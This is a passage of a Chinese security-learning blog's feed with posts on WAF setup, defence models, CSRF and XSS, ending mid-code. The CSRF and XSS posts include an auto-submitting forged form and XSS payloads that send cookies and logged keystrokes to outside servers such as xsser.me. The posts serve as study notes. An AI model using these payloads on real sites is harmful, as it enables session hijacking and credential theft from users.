        &lt;h1 id=&quot;概述&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#概述&quot;&gt;&lt;/a&gt; 概述&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;RASP, 一种已探针的形式，将保护引擎注入到应用服务中，可在文件，数据库，网络等多个方面，对应用进行保护，当发生敏感
      
    
    </summary>
    
      <category term="企业安全建设" scheme="http://yoursite.com/categories/%E4%BC%81%E4%B8%9A%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
    
      <category term="security" scheme="http://yoursite.com/tags/security/"/>
    
      <category term="企业安全建设" scheme="http://yoursite.com/tags/%E4%BC%81%E4%B8%9A%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
  </entry>
  
  <entry>
    <title>3-搭建WAF环境</title>
    <link href="http://yoursite.com/2018/06/18/3-%E6%90%AD%E5%BB%BAWAF%E7%8E%AF%E5%A2%83/"/>
    <id>http://yoursite.com/2018/06/18/3-搭建WAF环境/</id>
    <published>2018-06-18T12:19:26.000Z</published>
    <updated>2018-06-20T15:51:32.216Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a class="markdownIt-Anchor" href="#概述"></a> 概述</h1><blockquote><p>针对HTTP/HTTPS的安全策略为web应用提供保护的产品，承担了sql注入，xss，远程命令执行，目录遍历等攻击的抵抗，是守护安全的第一道防线</p></blockquote><h2 id="优点"><a class="markdownIt-Anchor" href="#优点"></a> 优点</h2><ol><li>使用，配置简单方便</li><li>能够抵抗常见的扫描和常见的漏洞测探</li></ol><h2 id="缺点"><a class="markdownIt-Anchor" href="#缺点"></a> 缺点</h2><ol><li>防护能力不足以对抗黑产，依赖规则，针对未知攻击无应对方法，容易绕过</li><li>无法承担基础业务安全能力，比如褥羊毛行为，刷短信接口等</li><li>审计能力不足，出现事故无法提取较为详细的事件log记录等等</li></ol><h1 id="配置一个简单的waf"><a class="markdownIt-Anchor" href="#配置一个简单的waf"></a> 配置一个简单的WAF</h1><h2 id="openresty"><a class="markdownIt-Anchor" href="#openresty"></a> OpenResty</h2><blockquote><p>基于nginx与lua的高性能web平台，内部集成了大量精良的nginx模块，用于方便的搭建超高并发和拓展性极高的web应用，web服务和动态网管</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"># 安装</span><br><span class="line"></span><br><span class="line">Debian 和 Ubuntu 用户</span><br><span class="line">推荐您使用 apt-get安装以下的开发库:</span><br><span class="line"></span><br><span class="line">apt-get install libpcre3-dev \</span><br><span class="line">    libssl-dev perl make build-essential curl</span><br><span class="line">Fedora 和 RedHat 用户</span><br><span class="line">推荐您使用yum安装以下的开发库:</span><br><span class="line"></span><br><span class="line">yum install pcre-devel openssl-devel gcc curl</span><br><span class="line"></span><br><span class="line">./configure</span><br><span class="line">然后在进入 openresty-VERSION/ 目录, 然后输入以下命令配置:</span><br><span class="line"></span><br><span class="line">./configure</span><br><span class="line">默认, --prefix=/usr/local/openresty 程序会被安装到/usr/local/openresty目录。</span><br><span class="line"></span><br><span class="line">您可以指定各种选项，比如</span><br><span class="line"></span><br><span class="line">./configure --prefix=/opt/openresty \</span><br><span class="line">            --with-luajit \</span><br><span class="line">            --without-http_redis2_module \</span><br><span class="line">            --with-http_iconv_module \</span><br><span class="line">            --with-http_postgres_module</span><br><span class="line">            </span><br><span class="line">make</span><br><span class="line">或者make -j2 （双核编译）</span><br><span class="line"></span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><h2 id="waf"><a class="markdownIt-Anchor" href="#waf"></a> waf</h2><p><a href="https://github.com/unixhot/waf.git" target="_blank" rel="noopener">https://github.com/unixhot/waf.git</a></p><h2 id="配置反向代理"><a class="markdownIt-Anchor" href="#配置反向代理"></a> 配置反向代理</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"># openresty</span><br><span class="line">http&#123;</span><br><span class="line">    ...</span><br><span class="line">    lua_shared_dict limit 50m;</span><br><span class="line">    lua_package_path &quot;/usr/local/openresty/nginx/conf/waf/?.lua&quot;;</span><br><span class="line">    init_by_lua_file &quot;/usr/local/openresty/nginx/conf/waf/init.lua&quot;;</span><br><span class="line">    access_by_lua_file &quot;/usr/local/openresty/nginx/conf/waf/access.lua&quot;;</span><br><span class="line">&#125;</span><br><span class="line">include &quot;/usr/local/openresty/nginx/conf/www.testwaf.com.conf&quot;;</span><br><span class="line"></span><br><span class="line">./nginx -s reload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># www.testwaf.com.conf</span><br><span class="line">upstream testwaf&#123;</span><br><span class="line">    server 192.168.1.12:80;</span><br><span class="line">&#125;</span><br><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    server_name www.testwaf.com;</span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_pass: http://testwaf;</span><br><span class="line">        index index.html index.htm;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 最好使用root权限安装</span><br></pre></td></tr></table></figure><h1 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h1><blockquote><p>重点还是学习waf是怎么写的，后面在仔细研究下源码。</p></blockquote><h1 id="reference"><a class="markdownIt-Anchor" href="#reference"></a> Reference</h1><p><a href="https://openresty.org/cn/" target="_blank" rel="noopener">https://openresty.org/cn/</a></p><p><a href="https://openresty.org/cn/installation.html" target="_blank" rel="noopener">https://openresty.org/cn/installation.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;概述&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#概述&quot;&gt;&lt;/a&gt; 概述&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;针对HTTP/HTTPS的安全策略为web应用提供保护的产品，承担了sql注入，xss，远程命令执行，目录遍历等攻击的
      
    
    </summary>
    
      <category term="企业安全建设" scheme="http://yoursite.com/categories/%E4%BC%81%E4%B8%9A%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
    
      <category term="security" scheme="http://yoursite.com/tags/security/"/>
    
      <category term="企业安全建设" scheme="http://yoursite.com/tags/%E4%BC%81%E4%B8%9A%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
  </entry>
  
  <entry>
    <title>2-常见防御体系</title>
    <link href="http://yoursite.com/2018/06/18/2-%E5%B8%B8%E8%A7%81%E9%98%B2%E5%BE%A1%E4%BD%93%E7%B3%BB/"/>
    <id>http://yoursite.com/2018/06/18/2-常见防御体系/</id>
    <published>2018-06-18T12:19:01.000Z</published>
    <updated>2018-06-20T15:51:24.330Z</updated>
    
    <content type="html"><![CDATA[<h1 id="名词解释"><a class="markdownIt-Anchor" href="#名词解释"></a> 名词解释</h1><h3 id="ids"><a class="markdownIt-Anchor" href="#ids"></a> IDS：</h3><blockquote><p>IDS是英文“Intrusion Detection Systems”的缩写，中文意思是“入侵检测系统”。<br>专业上讲就是依照一定的安全策略，通过软、硬件，对网络、系统的运行状况进行监视，<br>尽可能发现各种攻击企图、攻击行为或者攻击结果，以保证网络系统资源的机密性、完整性和可用性。<br>做一个形象的比喻：<br>假如防火墙是一幢大楼的门锁，那么IDS就是这幢大楼里的监视系统。一旦小偷爬窗进入大楼，或内部人员有越界行为，只有实时监视系统才能发现情况并发出警告。</p></blockquote><h3 id="ips"><a class="markdownIt-Anchor" href="#ips"></a> IPS</h3><blockquote><p>入侵防御系统(IPS: Intrusion Prevention System)是电脑网络安全设施，是对防病毒软件（Antivirus Programs）和防火墙(Packet Filter, Application Gateway)的补充。 入侵防御系统(Intrusion-prevention system)是一部能够监视网络或网络设备的网络资料传输行为的计算机网络安全设备，能够即时的中断、调整或隔离一些不正常或是具有伤害性的网络资料传输行为。</p></blockquote><h3 id="utm"><a class="markdownIt-Anchor" href="#utm"></a> UTM</h3><blockquote><p>UTM是对传统防护手段的整合和升华，是建立在原有安全网关设备基础之上的，拥有防火墙、入侵防御(IPS)、防病毒(AV)、VPN、内容过滤、反垃圾邮件等多种功能，这些技术处理方式仍然是UTM的基础，但这些处理方式不再各自为战，需要在统一的安全策略下相互配合，协同工作。<br>对于众多的功能，有必备功能和增值功能之分。一般而言，防火墙、VPN、入侵防御、防病毒是必备的功能模块，缺少任何一个不能称之为UTM。其余是增值功能，用户可以根据自身需求进行选择。</p></blockquote><h3 id="web威胁感知"><a class="markdownIt-Anchor" href="#web威胁感知"></a> web威胁感知</h3><blockquote><p>识别Web应用攻击，能够深度挖掘黑客针对Web的拖库、远程命令执行、敏感文件泄露、Webshell后门等攻击事件并发出准确的报警</p></blockquote><h1 id="常见的防御体系"><a class="markdownIt-Anchor" href="#常见的防御体系"></a> 常见的防御体系</h1><h2 id="边界防护"><a class="markdownIt-Anchor" href="#边界防护"></a> 边界防护</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&quot;在网络边界解决问题，强调御敌于国门之外&quot;</span><br><span class="line"></span><br><span class="line">主要措施：</span><br><span class="line">a. WAF</span><br><span class="line">b. 内外网隔离</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">优点：</span><br><span class="line">部署简单</span><br><span class="line"></span><br><span class="line">缺点：</span><br><span class="line">内网突破后，黑客就控制了一切。</span><br></pre></td></tr></table></figure><h2 id="纵深防御体系"><a class="markdownIt-Anchor" href="#纵深防御体系"></a> 纵深防御体系</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&quot;纵深防御本质为多层防御，增加攻击成本。&quot;</span><br><span class="line"></span><br><span class="line">纵深防御分为四部分：</span><br><span class="line">a. 网络边界：WAF，防火墙，IPS，UTM，流量清洗设备等等</span><br><span class="line">b. 网络层：IDS，web威胁感知，web审计</span><br><span class="line">c. 服务器端：主机IDS，服务器杀毒，内核假哭，主机WAF等</span><br><span class="line">d. 数据库：数据库审计，数据库防火墙等</span><br><span class="line"></span><br><span class="line">优点：</span><br><span class="line">防护的定位清晰，攻击成本提高，安全性提高</span><br><span class="line"></span><br><span class="line">缺点：</span><br><span class="line">各个部分缺乏协同性，检测手段多基于黑名单和规则，对于专业的黑客而言，也是可以突破的。</span><br></pre></td></tr></table></figure><h2 id="河防体系"><a class="markdownIt-Anchor" href="#河防体系"></a> 河防体系</h2><blockquote><p>在隔离的基础上，严格控制办公网络对生产网络的访问，同时在生产网络的内部进行隔离的基础上，进行边界防护和检测。适用于数据中心用户</p></blockquote><h2 id="塔防体系"><a class="markdownIt-Anchor" href="#塔防体系"></a> 塔防体系</h2><blockquote><p>纵深防御的一种，加上了云的管控能力和威胁情报数据。</p></blockquote><h1 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考</h1><p><a href="https://anquan.baidu.com/pages/threat.html" target="_blank" rel="noopener">https://anquan.baidu.com/pages/threat.html</a></p><p><a href="https://searchsecurity.techtarget.com.cn/11-17666/" target="_blank" rel="noopener">https://searchsecurity.techtarget.com.cn/11-17666/</a></p><p><a href="https://baike.baidu.com/item/IPS/2131631" target="_blank" rel="noopener">https://baike.baidu.com/item/IPS/2131631</a></p><p><a href="https://zh.wikipedia.org/wiki/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/入侵检测系统</a></p><p><a href="https://baike.baidu.com/item/IDS/22042" target="_blank" rel="noopener">https://baike.baidu.com/item/IDS/22042</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;名词解释&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#名词解释&quot;&gt;&lt;/a&gt; 名词解释&lt;/h1&gt;
&lt;h3 id=&quot;ids&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#ids&quot;&gt;&lt;/a&gt; IDS：&lt;/h3&gt;

      
    
    </summary>
    
      <category term="企业安全建设" scheme="http://yoursite.com/categories/%E4%BC%81%E4%B8%9A%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
    
      <category term="security" scheme="http://yoursite.com/tags/security/"/>
    
      <category term="企业安全建设" scheme="http://yoursite.com/tags/%E4%BC%81%E4%B8%9A%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
  </entry>
  
  <entry>
    <title>1-企业安全建设入门</title>
    <link href="http://yoursite.com/2018/06/18/1-%E4%BC%81%E4%B8%9A%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE%E5%85%A5%E9%97%A8/"/>
    <id>http://yoursite.com/2018/06/18/1-企业安全建设入门/</id>
    <published>2018-06-18T12:18:46.000Z</published>
    <updated>2018-06-20T15:51:18.450Z</updated>
    
    <content type="html"><![CDATA[<h1 id="两个概念"><a class="markdownIt-Anchor" href="#两个概念"></a> 两个概念</h1><p>PDR：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">protection（保护）：</span><br><span class="line">加密，认证，访问控制，防火墙，杀毒软件等等</span><br><span class="line"></span><br><span class="line">detection（检测）：</span><br><span class="line">入侵检测，漏洞扫描等</span><br><span class="line"></span><br><span class="line">response（应急响应）：</span><br><span class="line">建立应急响应机制，形成对安全的及时响应能力等</span><br></pre></td></tr></table></figure><p>P2DR</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">protection</span><br><span class="line">Detection</span><br><span class="line">Response</span><br><span class="line">Police</span><br><span class="line"></span><br><span class="line">建立在PDR的基础上，多了一个Police（根据风险分析产生的安全策略），其中Police是模型的核心。</span><br><span class="line"></span><br><span class="line">着重于描述：</span><br><span class="line">系统中哪些资源需要保护？</span><br><span class="line">如何实现对它们的保护？</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;两个概念&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#两个概念&quot;&gt;&lt;/a&gt; 两个概念&lt;/h1&gt;
&lt;p&gt;PDR：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gut
      
    
    </summary>
    
      <category term="企业安全建设" scheme="http://yoursite.com/categories/%E4%BC%81%E4%B8%9A%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
    
      <category term="security" scheme="http://yoursite.com/tags/security/"/>
    
      <category term="企业安全建设" scheme="http://yoursite.com/tags/%E4%BC%81%E4%B8%9A%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
  </entry>
  
  <entry>
    <title>CSRF攻击学习</title>
    <link href="http://yoursite.com/2018/06/14/CSRF%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/"/>
    <id>http://yoursite.com/2018/06/14/CSRF攻击学习/</id>
    <published>2018-06-14T15:26:27.000Z</published>
    <updated>2018-06-20T15:52:43.825Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a class="markdownIt-Anchor" href="#概述"></a> 概述</h1><blockquote><p>一图胜千言<br><img src="/images/csrf.jpg" alt="图片"></p></blockquote><h1 id="攻击方式"><a class="markdownIt-Anchor" href="#攻击方式"></a> 攻击方式</h1><ol><li>GET方式</li></ol><blockquote><p>假如现在有一个链接： <a href="https://csrf.com/m?addUser=id12345" target="_blank" rel="noopener">https://csrf.com/m?addUser=id12345</a> 那么我们就可以构造一个图片</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&apos;https://csrf.com/m?addUser=id12345&apos;&gt;</span><br></pre></td></tr></table></figure><p>只要你访问我的网站，那么就会触发这个链接，从而关注了我</p><ol start="2"><li>POST方式</li></ol><blockquote><p>POST的请求经常伴随着跳转，一跳转，就会暴露，这个时候我们就要考虑加一个iframe。<br>但是在csrf测试的页面加iframe，根据同源政策，显示不来内容。于是我们新建另一个页面，加上iframe，连接到csrf的测试页面。如下：<br>新建一个iframe</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;&lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;iframe style=&quot;display:block&quot; src=&apos;test.html&apos;&gt;&lt;/iframe&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>在建一个test.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE HTML&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en-US"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>CSRF GET<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">form</span>  <span class="attr">name</span>=<span class="string">"form1"</span> <span class="attr">action</span>=<span class="string">"http://127.0.0.1:5000/csrf"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'hidden'</span> <span class="attr">name</span>=<span class="string">'username'</span> <span class="attr">value</span>=<span class="string">"csrf_ee1"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">value</span>=<span class="string">"qwe1231"</span>/&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">          <span class="built_in">document</span>.forms.form1.submit();</span></span><br><span class="line"><span class="undefined">     </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这样一来，成功复现了csrf</p><h1 id="什么叫做xsrf"><a class="markdownIt-Anchor" href="#什么叫做xsrf"></a> 什么叫做XSRF？</h1><blockquote><p>XSRF指的是xss+csrf的攻击，指的是一个网站既有xss又有csrf。 这样一来就可以进行两者的结合，通过xss注入csrf的html代码。</p></blockquote><p>通过js生成代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">var</span> iframe = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</span><br><span class="line">    iframe.style.display = <span class="string">'none'</span>;</span><br><span class="line">    iframe.src=<span class="string">'test.html'</span>;</span><br><span class="line">    <span class="built_in">document</span>.body.appendChild(iframe);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><h1 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h1><p>csrf总的来说，主要聚焦于写，并不会窃取用户的数据。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;概述&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#概述&quot;&gt;&lt;/a&gt; 概述&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;一图胜千言&lt;br&gt;
&lt;img src=&quot;/images/csrf.jpg&quot; alt=&quot;图片&quot;&gt;&lt;/p&gt;
&lt;/block
      
    
    </summary>
    
      <category term="security" scheme="http://yoursite.com/categories/security/"/>
    
    
      <category term="security" scheme="http://yoursite.com/tags/security/"/>
    
      <category term="CSRF" scheme="http://yoursite.com/tags/CSRF/"/>
    
  </entry>
  
  <entry>
    <title>xss攻击学习</title>
    <link href="http://yoursite.com/2018/06/14/xss%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/"/>
    <id>http://yoursite.com/2018/06/14/xss攻击学习/</id>
    <published>2018-06-14T15:12:45.000Z</published>
    <updated>2018-06-24T04:39:33.583Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概念"><a class="markdownIt-Anchor" href="#概念"></a> 概念</h1><blockquote><p>xss 全称为 cross site scripting. 特指攻击者利用网站对于用户输入过滤不足的缺陷，输入可以对用户造成影响的html/js代码，从而窃取用户信息，进行病毒侵害等行为。</p></blockquote><h2 id="类型"><a class="markdownIt-Anchor" href="#类型"></a> 类型</h2><h3 id="反射型"><a class="markdownIt-Anchor" href="#反射型"></a> 反射型</h3><blockquote><p>将用户输入的数据通过url的形式直接或未经完善过滤就在浏览器中输出，导致浏览器执行了用户输入的代码数据</p></blockquote><h3 id="存储型"><a class="markdownIt-Anchor" href="#存储型"></a> 存储型</h3><blockquote><p>程序将用户输入的数据信息保存在了服务器端（如数据库），网页在查询数据时候，从中获取了畸形数据内容，在网页进行展示。造成xss</p></blockquote><h3 id="dom型"><a class="markdownIt-Anchor" href="#dom型"></a> DOM型</h3><blockquote><p>反射型xss的一种，不同点在于，注入的方式是根据js的DOM进行分析并注入,较为少见。</p></blockquote><h1 id="攻击"><a class="markdownIt-Anchor" href="#攻击"></a> 攻击</h1><h2 id="盗取cookies"><a class="markdownIt-Anchor" href="#盗取cookies"></a> 盗取cookies</h2><ol><li>简单的：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#js</span><br><span class="line">Document.location=&apos;https://www.xsser.me/cookies.php?cookie=&apos;+document.cookie;</span><br><span class="line"></span><br><span class="line">#php</span><br><span class="line">&lt;?php</span><br><span class="line">$cookie = $_GET[&apos;cookie&apos;];</span><br><span class="line">$log = fopen(&quot;cookies.txt&quot;,&quot;a&quot;);</span><br><span class="line">Fwrite($log,$cookie.&quot;&quot;\n&quot;)</span><br><span class="line">Fclose($log)</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><ol start="2"><li>复杂的：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">(function() &#123;</span><br><span class="line">    (new Image()).src = &apos;http://xsser.me/index.php?do=api&amp;id=RAMWD1&amp;location=&apos; + escape((function() &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            return document.location.href</span><br><span class="line">        &#125; catch (e) &#123;</span><br><span class="line">            return &apos;&apos;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)()) + &apos;&amp;toplocation=&apos; + escape((function() &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            return top.location.href</span><br><span class="line">        &#125; catch (e) &#123;</span><br><span class="line">            return &apos;&apos;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)()) + &apos;&amp;cookie=&apos; + escape((function() &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            return document.cookie</span><br><span class="line">        &#125; catch (e) &#123;</span><br><span class="line">            return &apos;&apos;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)()) + &apos;&amp;opener=&apos; + escape((function() &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            return (window.opener &amp;&amp; window.opener.location.href) ? window.opener.location.href : &apos;&apos;</span><br><span class="line">        &#125; catch (e) &#123;</span><br><span class="line">            return &apos;&apos;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)());</span><br><span class="line">&#125;)();</span><br><span class="line">if (&apos;&apos; == 1) &#123;</span><br><span class="line">    keep = new Image();</span><br><span class="line">    keep.src = &apos;http://xsser.me/index.php?do=keepsession&amp;id=RAMWD1&amp;url=&apos; + escape(document.location) + &apos;&amp;cookie=&apos; + escape(document.cookie)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="读取用户键盘输入"><a class="markdownIt-Anchor" href="#读取用户键盘输入"></a> 读取用户键盘输入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#!js</span><br><span class="line">$(document).ready(function()</span><br><span class="line">&#123;</span><br><span class="line">    var server = &quot;http://server.com/&quot;; //接收服务器</span><br><span class="line">    var gate = &quot;data.php?data=&quot;;  //接收文件</span><br><span class="line">    var tabURL = window.location.href;</span><br><span class="line">    var keys=&apos;&apos;;</span><br><span class="line">    </span><br><span class="line">    document.onkeypress = function(e) &#123;</span><br><span class="line">      get = window.event?event:e;</span><br><span class="line">      key = get.keyCode?get.keyCode:get.charCode;</span><br><span class="line">      key = String.fromCharCode(key);</span><br><span class="line">      keys+=key;</span><br><span class="line">    &#125;</span><br><span class="line">    window.setInterval(function()&#123;</span><br><span class="line">      new Image().src = server+gate+keys;</span><br><span class="line">      keys = &apos;&apos;;</span><br><span class="line">    &#125;, 1000);        </span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">#!php</span><br><span class="line">&lt;?php</span><br><span class="line">$txt = $_GET[&apos;data&apos;];</span><br><span class="line">$log = fopen(&quot;keylog.txt&quot;, &quot;a&quot;) or 